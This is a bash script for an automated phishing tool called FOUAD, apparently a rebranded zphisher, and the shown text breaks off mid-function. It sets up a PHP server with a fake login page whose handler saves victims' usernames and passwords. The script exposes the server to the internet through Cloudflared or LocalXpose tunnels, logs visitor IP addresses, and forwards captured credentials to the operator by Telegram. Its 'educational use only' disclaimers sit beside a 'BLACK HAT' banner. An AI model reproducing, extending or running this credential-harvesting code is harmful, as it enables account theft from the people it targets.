#!/bin/bash

##   FOUAD 	: 	Automated Phishing Tool
##   Author 	: 	FOUAD ZULOF
##   Version 	: 	2.3.5
##   Github 	:  https://github.com/loals2sa


##                   GNU GENERAL PUBLIC LICENSE
##                    Version 1, 26 APR 2008
##
##    Copyright (C) 2008 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 202  FOUAD ZULOF (site_instagram @1.PVL)
##


__version__="2.3.5"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080' 

## FOUAD Advanced Color Scheme with Gradient Effects
## Bright Colors (FG)
RED="$(printf '\033[91m')"  
GREEN="$(printf '\033[92m')"  
ORANGE="$(printf '\033[93m')"  
BLUE="$(printf '\033[94m')"  
MAGENTA="$(printf '\033[95m')"  
CYAN="$(printf '\033[96m')"  
WHITE="$(printf '\033[97m')"  
BLACK="$(printf '\033[90m')"

## Advanced Colors
LIGHT_RED="$(printf '\033[38;5;196m')"
LIGHT_GREEN="$(printf '\033[38;5;46m')"
LIGHT_BLUE="$(printf '\033[38;5;51m')"
LIGHT_YELLOW="$(printf '\033[38;5;226m')"
LIGHT_PURPLE="$(printf '\033[38;5;129m')"
LIGHT_CYAN="$(printf '\033[38;5;87m')"
GOLD="$(printf '\033[38;5;220m')"
SILVER="$(printf '\033[38;5;250m')"
NEON_GREEN="$(printf '\033[38;5;118m')"
NEON_PINK="$(printf '\033[38;5;198m')"
NEON_BLUE="$(printf '\033[38;5;39m')"

## Background Colors
REDBG="$(printf '\033[101m')"  
GREENBG="$(printf '\033[102m')"  
ORANGEBG="$(printf '\033[103m')"  
BLUEBG="$(printf '\033[104m')"  
MAGENTABG="$(printf '\033[105m')"  
CYANBG="$(printf '\033[106m')"  
WHITEBG="$(printf '\033[107m')"  
BLACKBG="$(printf '\033[100m')"

## Special Effects
BOLD="$(printf '\033[1m')"
DIM="$(printf '\033[2m')"
UNDERLINE="$(printf '\033[4m')"
BLINK="$(printf '\033[5m')"
REVERSE="$(printf '\033[7m')"
RESET="$(printf '\033[0m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Advanced Animation and Effects Functions

# Auto-Lighting Effect Function
auto_light() {
	local text="$1"
	local colors=("$NEON_GREEN" "$NEON_BLUE" "$NEON_PINK" "$GOLD" "$LIGHT_CYAN")
	local color_count=${#colors[@]}
	local i=0
	while IFS= read -r line; do
		local color_index=$((i % color_count))
		echo -e "${colors[$color_index]}$line${RESET}"
		((i++))
	done <<< "$text"
}

# Advanced Loading Animation
loading_animation() {
	local text="$1"
	local duration="${2:-3}"
	local chars="⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
	local delay=0.1
	
	for ((i=0; i<duration*10; i++)); do
		local char_index=$((i % ${#chars}))
		printf "\r${NEON_BLUE}[${GOLD}${chars:$char_index:1}${NEON_BLUE}]${LIGHT_CYAN} $text${RESET}"
		sleep $delay
	done
	printf "\r${NEON_GREEN}[${GOLD}✓${NEON_GREEN}]${LIGHT_GREEN} $text - Complete!${RESET}\n"
}

# Progress Bar Function
progress_bar() {
	local current="$1"
	local total="$2"
	local text="$3"
	local width=50
	local percentage=$((current * 100 / total))
	local filled=$((current * width / total))
	local empty=$((width - filled))
	
	printf "\r${NEON_BLUE}[${NEON_GREEN}"
	printf "%*s" $filled | tr ' ' '█'
	printf "${LIGHT_CYAN}"
	printf "%*s" $empty | tr ' ' '░'
	printf "${NEON_BLUE}] ${GOLD}%d%%${LIGHT_CYAN} %s${RESET}" $percentage "$text"
}

# Typewriter Effect
typewriter() {
	local text="$1"
	local color="${2:-$LIGHT_CYAN}"
	local delay="${3:-0.03}"
	
	for ((i=0; i<${#text}; i++)); do
		printf "${color}${text:$i:1}${RESET}"
		sleep $delay
	done
	echo
}

# Matrix Rain Effect (simplified)
matrix_effect() {
	local lines=5
	local cols=$(tput cols 2>/dev/null || echo 80)
	local chars="01"
	
	for ((i=0; i<lines; i++)); do
		printf "${NEON_GREEN}"
		for ((j=0; j<cols; j++)); do
			if ((RANDOM % 3 == 0)); then
				printf "${chars:$((RANDOM % 2)):1}"
			else
				printf " "
			fi
		done
		printf "${RESET}\n"
		sleep 0.1
	done
}

# Compact System Information
get_system_info() {
	local os_info=$(uname -s 2>/dev/null || echo "Unknown")
	local arch_info=$(uname -m 2>/dev/null || echo "Unknown")
	local mem_info=$(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo "Unknown")
	
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_GREEN}💻 ${LIGHT_CYAN}$os_info ${NEON_GREEN}• ${LIGHT_CYAN}$arch_info ${NEON_GREEN}• ${LIGHT_CYAN}$mem_info RAM ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}
	EOF
}

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi

if [[ ! -d "auth" ]]; then
	mkdir -p "auth"
fi

if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Remove logfile
if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"
fi

if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
	# fallback: print RESETBG if tput not available
	printf "%b" "${RESETBG}" 2>/dev/null || true
	return
}

## Script termination
exit_on_signal_SIGINT() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
	exit 0
}

exit_on_signal_SIGTERM() {
	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
	exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Kill already running process
kill_pid() {
	check_PID="php cloudflared loclx"
	for process in ${check_PID}; do
		if pidof ${process} >/dev/null 2>&1; then
			killall ${process} > /dev/null 2>&1
		fi
	done
}


# Enhanced Update Check
check_update(){
	echo -ne "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_CYAN} Checking for FOUAD updates: "
	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"

	if [[ $new_version != $__version__ ]]; then
		echo -ne "${NEON_GREEN}${BOLD}✓ Update Available!${RESET}\n"
		sleep 2
		echo -ne "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_YELLOW} Downloading FOUAD update..."
		pushd "$HOME" > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"

		if [[ -e ".zphisher.tar.gz" ]]; then
			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
			rm -f .zphisher.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
			{ reset_color; exit 1; }
		fi
	else
		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
	fi
}

## Enhanced Internet Status Check
check_status() {
	echo -ne "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_CYAN} Checking Internet Connection: "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null
	[ $? -eq 0 ] && echo -e "${NEON_GREEN}${BOLD}✓ Online${RESET}" && check_update || echo -e "${LIGHT_RED}${BOLD}✗ Offline${RESET}"
}

## Compact Beautiful FOUAD Banner
banner() {
	clear
	
	# Compact 3D Banner
	cat <<- EOF
		${WHITE}${BOLD}      _==_        ${RESET}
		${WHITE}${BOLD}    _/____\\_      ${RESET}
		${WHITE}${BOLD}     (____)       ${RESET}
		${WHITE}${BOLD}      |  |   BLACK HAT${RESET}
		
		${WHITE}${BOLD}  ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ ${RESET}
		${WHITE}${BOLD}  ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗${RESET}
		${WHITE}${BOLD}  █████╗  ██║   ██║██║   ██║███████║██║  ██║${RESET}
		${WHITE}${BOLD}  ██╔══╝  ██║   ██║██║   ██║██╔══██║██║  ██║${RESET}
		${WHITE}${BOLD}  ██║     ╚██████╔╝╚██████╔╝██║  ██║██████╔╝${RESET}
		${WHITE}${BOLD}  ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ${GOLD}v${__version__}${RESET}
		
		${WHITE}┌─────────────────────────────────────────────────────────┐
		${WHITE}│ ${WHITE}${BOLD}FOUAD ULTRA FRAMEWORK${RESET} ${NEON_GREEN}[${LIGHT_RED}PREMIUM${NEON_GREEN}] ${WHITE}│
		${WHITE}└─────────────────────────────────────────────────────────┘${RESET}
		${WHITE}👤 ${WHITE}${BOLD}FOUAD ZULOF${RESET} ${LIGHT_CYAN}• ${WHITE}github.com/loals2sa ${LIGHT_CYAN}• ${GOLD}@1.PVL${RESET}
		${WHITE}🔥 ${LIGHT_CYAN}3D UI • AI Monitor • 35+ Platforms • ${LIGHT_GREEN}${BLINK}ACTIVE${RESET}
	EOF
	
	echo
}

## Compact Small Banner
banner_small() {
	cat <<- EOF
		${NEON_PINK}${BOLD}███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗${RESET}
		${NEON_BLUE}${BOLD}██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗${RESET}
		${GOLD}${BOLD}█████╗  ██║   ██║██║   ██║███████║██║  ██║${RESET}
		${LIGHT_CYAN}${BOLD}██╔══╝  ██║   ██║██║   ██║██╔══██║██║  ██║${RESET}
		${NEON_GREEN}${BOLD}██║     ╚██████╔╝╚██████╔╝██║  ██║██████╔╝${RESET}
		${LIGHT_PURPLE}${BOLD}╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝${GOLD} v${__version__}${RESET}
	EOF
}

## Ultra Advanced Dependencies Installation
dependencies() {
	loading_animation "Initializing FOUAD dependency manager" 2
	echo -e "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_CYAN} Setting up FOUAD dependencies..."

	if [[ -d "/data/data/com.termux/files/home" ]]; then
		if [[ ! $(command -v proot) ]]; then
			loading_animation "Installing proot package" 1
			echo -e "\n${NEON_GREEN}[${GOLD}+${NEON_GREEN}]${LIGHT_YELLOW} Installing package: ${NEON_PINK}proot${RESET}"
			pkg install proot resolv-conf -y
		fi

		if [[ ! $(command -v tput) ]]; then
			loading_animation "Installing ncurses-utils package" 1
			echo -e "\n${NEON_GREEN}[${GOLD}+${NEON_GREEN}]${LIGHT_YELLOW} Installing package: ${NEON_PINK}ncurses-utils${RESET}"
			pkg install ncurses-utils -y
		fi
	fi

	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
		echo -e "\n${NEON_GREEN}[${GOLD}✓${NEON_GREEN}]${LIGHT_GREEN} All packages already installed!"
		for i in {1..10}; do
			progress_bar $i 10 "Verifying installations"
			sleep 0.1
		done
		echo
	else
		pkgs=(php curl unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${NEON_GREEN}[${GOLD}+${NEON_GREEN}]${LIGHT_YELLOW} Installing package: ${NEON_PINK}$pkg${RESET}"
				if [[ $(command -v pkg) ]]; then
					pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then
					sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then
					sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then
					sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then
					sudo yum -y install "$pkg"
				else
					echo -e "\n${LIGHT_RED}[${GOLD}!${LIGHT_RED}]${LIGHT_RED} Unsupported package manager! Install packages manually.${RESET}"
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Enhanced Cloudflared Installation
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${NEON_GREEN}[${GOLD}✓${NEON_GREEN}]${LIGHT_GREEN} Cloudflared already installed!"
	else
		echo -e "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_CYAN} Installing Cloudflared tunnel service...${RESET}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Enhanced LocalXpose Installation
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${NEON_GREEN}[${GOLD}✓${NEON_GREEN}]${LIGHT_GREEN} LocalXpose already installed!"
	else
		echo -e "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_CYAN} Installing LocalXpose tunnel service...${RESET}"
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

## Enhanced Exit Message
msg_exit() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GOLD}${BOLD}╔════════════════════════════════════════════════════════════════╗
		${GOLD}${BOLD}║                    ${NEON_GREEN}THANK YOU FOR USING FOUAD                    ${GOLD}║
		${GOLD}${BOLD}╚════════════════════════════════════════════════════════════════╝${RESET}
		
		${NEON_PINK}${BOLD}  🎯 Advanced Phishing Framework Session Ended
		${LIGHT_CYAN}  🔒 Remember: Use responsibly and ethically only!
		${NEON_GREEN}  ✨ Stay safe and keep learning cybersecurity!
		
		${GOLD}${BOLD}  👋 Have an amazing day ahead! ${RESET}
		
	EOF
	{ reset_color; exit 0; }
}

## Compact About Section
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GOLD}┌─────────────────────────────────────────────────────────┐
		${GOLD}│ ${NEON_PINK}ℹ️  FOUAD FRAMEWORK INFO ${GOLD}│
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

		${NEON_GREEN}👤 ${NEON_PINK}FOUAD ZULOF ${LIGHT_CYAN}[${GOLD}Security Researcher${LIGHT_CYAN}]
		${NEON_BLUE}🌐 ${NEON_GREEN}github.com/loals2sa
		${GOLD}📱 ${NEON_PINK}@1.PVL ${LIGHT_CYAN}• ${LIGHT_YELLOW}v${__version__} ${NEON_GREEN}[Enhanced]

		${LIGHT_RED}${BOLD}⚠️  WARNING: ${LIGHT_CYAN}Educational & Authorized Testing Only!
		${LIGHT_YELLOW}📋 Use responsibly - Author not liable for misuse

		${GOLD}🌟 ${LIGHT_PURPLE}Thanks: ZPhisher Team & Security Community

		${GOLD}┌─────────────────────────────────────────────────────────┐
		${NEON_BLUE}[${GOLD}00${NEON_BLUE}]${NEON_GREEN} Main Menu ${LIGHT_CYAN}• ${NEON_BLUE}[${GOLD}99${NEON_BLUE}]${LIGHT_RED} Exit
		${GOLD}└─────────────────────────────────────────────────────────┘${RESET}

	EOF

	read -p "${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${NEON_GREEN} Choose your action: ${NEON_PINK}"
	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${NEON_GREEN}[${GOLD}+${NEON_GREEN}]${LIGHT_CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Choose custom port
cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo -e "\n"
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			PORT=${CU_P}
			echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
			{ sleep 2; clear; banner_small; cusport; }
		fi		
	else 
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
	fi
}

## Enhanced Server Setup
setup_site() {
	echo -e "\n${NEON_BLUE}[${GOLD}★${NEON_BLUE}]${LIGHT_CYAN} Setting up FOUAD server environment...${RESET}"
	# Use site templates if available; otherwise generate a minimal site to avoid cp errors
	if [[ -d ".sites" && -d .sites/"$website" ]]; then
		cp -rf .sites/"$website"/* .server/www 2>/dev/null
		cp -f .sites/ip.php .server/www/ 2>/dev/null || true
	else
		mkdir -p .server/www
		cat > .server/www/ip.php << 'PHP'
<?php
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$time = date('Y-m-d H:i:s');
$line = "IP: $ip | TIME: $time | UA: $ua\n";
file_put_contents(__DIR__ . '/ip.txt', $line, FILE_APPEND | LOCK_EX);
?>
PHP
		cat > .server/www/login.php << 'PHP'
<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
$time = date('Y-m-d H:i:s');
$line = "Username: $user\nPass: $pass | TIME: $time\n\n";
file_put_contents(__DIR__ . '/usernames.txt', $line, FILE_APPEND | LOCK_EX);
echo '<meta http-equiv="refresh" content="0; url=index.html">';
?>
PHP
		cat > .server/www/index.html << 'HTML'
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>FOUAD • Demo Page</title>
  <style>
    body{background:#0b0b0b;color:#eaeaea;font-family:Arial,Helvetica,sans-serif;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{background:#141414;border:1px solid #333;border-radius:12px;padding:28px;max-width:360px;width:92%;box-shadow:0 6px 24px rgba(0,0,0,.5)}
    .logo{display:flex;align-items:center;gap:10px;justify-content:center;margin-bottom:16px}
    .hat{font-weight:800}
    label{display:block;margin:10px 0 6px;color:#aaa}
    input{width:100%;padding:10px 12px;border-radius:8px;border:1px solid #333;background:#0f0f0f;color:#eee}
    button{margin-top:14px;width:100%;padding:12px;border:0;border-radius:10px;background:#e91e63;color:#fff;font-weight:700;cursor:pointer}
    button:hover{background:#ff2d75}
    small{display:block;text-align:center;margin-top:10px;color:#777}
  </style>
  <script>fetch('ip.php').catch(()=>{});</script>
  </head>
  <body>
    <div class="card">
      <div class="logo"><span class="hat">_==_</span><div><strong>BLACK HAT</strong></div></div>
      <h3 style="text-align:center;margin:6px 0 16px">FOUAD Demo Login</h3>
      <form method="post" action="login.php">
        <label>Username</label>
        <input name="username" required>
        <label>Password</label>
        <input type="password" name="password" required>
        <button type="submit">Sign in</button>
      </form>
      <small>Local demo page generated because .sites templates were not found.</small>
    </div>
  </body>
</html>
HTML
	fi
	echo -ne "\n${NEON_GREEN}[${GOLD}★${NEON_GREEN}]${LIGHT_GREEN} Starting PHP server...${RESET}"
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}

## Enhanced IP Capture with Telegram Notification
capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	IFS=$'\n'
	echo -e "\n${NEON_GREEN}[${GOLD}🎯${NEON_GREEN}]${LIGHT_CYAN} Target IP captured: ${NEON_PINK}$IP${RESET}"
	echo -ne "\n${NEON_BLUE}[${GOLD}💾${NEON_BLUE}]${LIGHT_YELLOW} Saved to: ${LIGHT_GREEN}auth/ip.txt${RESET}"
	cat .server/www/ip.txt >> auth/ip.txt
	
	# Send Telegram notification if configured
	if [[ -f "$TELEGRAM_CONFIG_FILE" ]]; then
		local telegram_message="🎯 <b>Target IP Captured!</b>

📍 IP Address: <code>$IP</code>
🕐 Time: $(date '+%Y-%m-%d %H:%M:%S')
🖥️ FOUAD Device: $(hostname)
$(get_location)

📊 Campaign: $website
🔗 Active on: $HOST:$PORT"
		
		send_telegram_message "$telegram_message" &
		echo -ne "\n${NEON_BLUE}[${GOLD}📱${NEON_BLUE}]${LIGHT_GREEN} Telegram notification sent!${RESET}"
	fi
}

## Enhanced Credentials Capture with Telegram Notification
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${NEON_GREEN}[${GOLD}🔑${NEON_GREEN}]${LIGHT_CYAN} Username: ${NEON_PINK}$ACCOUNT${RESET}"
	echo -e "\n${NEON_GREEN}[${GOLD}🔐${NEON_GREEN}]${LIGHT_CYAN} Password: ${NEON_PINK}$PASSWORD${RESET}"
	echo -e "\n${NEON_BLUE}[${GOLD}💾${NEON_BLUE}]${LIGHT_YELLOW} Saved to: ${LIGHT_GREEN}auth/usernames.dat${RESET}"
	cat .server/www/usernames.txt >> auth/usernames.dat
	
	# Send Telegram notification if configured
	if [[ -f "$TELEGRAM_CONFIG_FILE" ]]; then
		local telegram_message="🔥 <b>CREDENTIALS CAPTURED!</b>

🔑 Username: <code>$ACCOUNT</code>
🔐 Password: <code>$PASSWORD</code>
🕐 Time: $(date '+%Y-%m-%d %H:%M:%S')
🖥️ FOUAD Device: $(hostname)
$(get_location)

📊 Platform: $website
🎯 Target IP: $IP
🔗 Campaign URL: $HOST:$PORT

💾 Saved to: auth/usernames.dat"
		
		send_telegram_message "$telegram_message" &
		echo -ne "\n${NEON_BLUE}[${GOLD}📱${NEON_BLUE}]${LIGHT_GREEN} Telegram notification sent!${RESET}"
	fi
	
	echo -ne "\n${LIGHT_CYAN}[${GOLD}⏳${LIGHT_CYAN}]${LIGHT_YELLOW} Waiting for next target... ${NEON_PINK}Ctrl+C${LIGHT_YELLOW} to exit${RESET}"
}

## Ultra Advanced Data Capture Monitor with Effects
capture_data() {
	echo -e "\n${GOLD}${BOLD}╔════════════════════════════════════════════════════════════════╗"
	echo -e "${GOLD}${BOLD}║                    ${NEON_PINK}FOUAD MONITORING ACTIVE                    ${GOLD}║"
	echo -e "${GOLD}${BOLD}╚════════════════════════════════════════════════════════════════╝${RESET}"
	
	echo -ne "\n${NEON_BLUE}[${GOLD}👁️${NEON_BLUE}]${LIGHT_CYAN} FOUAD monitoring for targets... ${NEON_PINK}Ctrl+C${LIGHT_CYAN} to stop${RESET}"
	
	local monitor_count=0
	while true; do
		# Animated monitoring indicator
		local indicators=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
		local indicator_index=$((monitor_count % ${#indicators[@]}))
		printf "\r${NEON_BLUE}[${GOLD}${indicators[$indicator_index]}${NEON_BLUE}]${LIGHT_CYAN} FOUAD monitoring... ${NEON_PINK}Ctrl+C${LIGHT_CYAN} to stop${RESET}"
		
		if [[ -e ".server/www/ip.txt" ]]; then
			play_sound "notification"
			echo -e "\n\n${NEON_GREEN}[${GOLD}🎯${NEON_GREEN}]${LIGHT_GREEN}${BLINK} TARGET IP DETECTED! ${RESET}"
			echo -e "${LIGHT_YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
			capture_ip
			play_sound "success"
			rm -rf .server/www/ip.txt
		fi
		
		if [[ -e ".server/www/usernames.txt" ]]; then
			play_sound "notification"
			echo -e "\n\n${NEON_GREEN}[${GOLD}🔥${NEON_GREEN}]${LIGHT_GREEN}${BLINK} CREDENTIALS CAPTURED! ${RESET}"
			echo -e "${LIGHT_YELLOW}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
			capture_creds
			play_sound "success"
			rm -rf .server/www/usernames.txt
		fi
		
		sleep 0.2
		((monitor_count++))
	done
}

## Start Cloudflared
start_cloudflared() { 
	rm .cld.log > /dev/null 2>&1 &
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
